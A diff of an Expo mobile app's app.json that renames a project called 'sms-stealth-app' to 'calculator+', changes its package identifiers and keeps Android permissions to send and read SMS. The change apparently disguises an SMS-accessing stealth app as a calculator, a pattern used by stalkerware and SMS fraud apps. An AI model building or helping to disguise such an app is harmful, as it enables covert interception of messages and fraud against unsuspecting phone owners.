@@ -1,7 +1,8 @@
+
 {
   "expo": {
-    "name": "sms-stealth-app-lhivoq",
-    "slug": "sms-stealth-app-lhivoq",
+    "name": "calculator+",
+    "slug": "calculator-plus",
     "version": "1.0.0",
     "orientation": "portrait",
     "icon": "./assets/images/final_quest_240x240.png",
@@ -16,14 +17,14 @@
     ],
     "ios": {
       "supportsTablet": true,
-      "bundleIdentifier": "com.calculator.sms"
+      "bundleIdentifier": "com.calculator.plus"
     },
     "android": {
       "adaptiveIcon": {
         "foregroundImage": "./assets/images/final_quest_240x240.png",
         "backgroundColor": "#F5F5F5"
       },
-      "package": "com.alscomany.com",
+      "package": "com.calculator.plus",
       "permissions": [
         "android.permission.SEND_SMS",
         "android.permission.READ_SMS",
@@ -46,11 +47,21 @@
             "targetSdkVersion": 35,
             "buildToolsVersion": "35.0.0",
             "kotlinVersion": "1.9.10",
-            "javaVersion": "VERSION_17"
+            "javaVersion": "VERSION_17",
+            "enableProguardInReleaseBuilds": false,
+            "enableShrinkResourcesInReleaseBuilds": false
+          },
+          "ios": {
+            "deploymentTarget": "13.0"
           }
         }
       ]
     ],
-    "scheme": "calculator"
+    "scheme": "calculator-plus",
+    "extra": {
+      "eas": {
+        "projectId": "calculator-plus"
+      }
+    }
   }
 }
